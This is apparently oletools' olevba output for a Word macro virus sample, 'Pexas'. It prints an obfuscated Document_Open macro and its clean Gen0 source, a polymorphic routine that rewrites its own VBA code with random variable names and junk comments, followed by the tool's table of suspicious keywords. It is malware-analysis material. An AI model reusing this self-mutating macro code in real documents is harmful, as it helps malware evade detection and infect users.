olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas-fe9fc85a95ec3ded6510d6145248b3359714764b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas-fe9fc85a95ec3ded6510d6145248b3359714764b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next 'vlE'+’!
If ThisDocument.FullName <> Templates(1).FullName Then 'QTJ'Q8z
FDFMp = 8 '�9O'_P‚
ReDim FYPMp(1 To FDFMp) As String 'pf%'Gy2
FYPMp(1) = "FDFMp": FYPMp(2) = "IUGMp": FYPMp(3) = "FYPMp": FYPMp(4) = "TMDMp" 'v\�'l�”
FYPMp(5) = "NXFMp": FYPMp(6) = "MOYMp": FYPMp(7) = "DFRMp": FYPMp(8) = "YAVMp" '’€–'^j!
Set DFRMp = ActiveDocument.VBProject.VBComponents(1).CodeModule 'SgC'—”‘
'modif var.'a—X'Bn€
For MOYMp = 1 To FDFMp ';E:'=9n
Randomize 'Vb}'v"g
NXFMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'ua€
For IUGMp = 2 To DFRMp.CountOfLines 'pJ�'o`K
YAVMp = DFRMp.Lines(IUGMp, 1) '%+‰'Wi;
If InStr(1, YAVMp, FYPMp(MOYMp), vbTextCompare) Then '3*�'‹=E
YAVMp = Replace(YAVMp, FYPMp(MOYMp), NXFMp, 1, -1, vbTextCompare) 'w~‘'7 0
DFRMp.ReplaceLine IUGMp, YAVMp 'W,'?|?
End If ']BB'vv•
Next IUGMp '{cS'.�%
Next MOYMp '>”�'d�&
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe'zW%'?@$
For MOYMp = 2 To DFRMp.CountOfLines 'ˆh’'F‹D
YAVMp = DFRMp.Lines(MOYMp, 1) 'n•q'IK'
If Len(YAVMp) <= 100 Then 'sz’'3“8
YAVMp = YAVMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
DFRMp.ReplaceLine MOYMp, YAVMp '7.…'|i0
End If '†=•'J^“
Next MOYMp 'YdY'\<0
End If 'Q%]'e_€
End Sub '’B{'�o4
-------------------------------------------------------------------------------
VBA MACRO Gen0.bas 
in file: Virus.MSWord.Pexas-fe9fc85a95ec3ded6510d6145248b3359714764b - OLE stream: 'Macros/VBA/Gen0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Poly()
On Error Resume Next
If ThisDocument.FullName <> Templates(1).FullName Then
nr = 8
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "suk": suk(4) = "myRange"
suk(5) = "strip": suk(6) = "ik": suk(7) = "char1": suk(8) = "nam1"
Set char1 = ActiveDocument.VBProject.VBComponents(1).CodeModule
'modif var.
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp"
For bkup = 2 To char1.CountOfLines
nam1 = char1.Lines(bkup, 1)
If InStr(1, nam1, suk(ik), vbTextCompare) Then
nam1 = Replace(nam1, suk(ik), strip, 1, -1, vbTextCompare)
char1.ReplaceLine bkup, nam1
End If
Next bkup
Next ik
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe
For ik = 2 To char1.CountOfLines
nam1 = char1.Lines(ik, 1)
If Len(nam1) <= 100 Then
nam1 = nam1 + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
char1.ReplaceLine ik, nam1
End If
Next ik
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

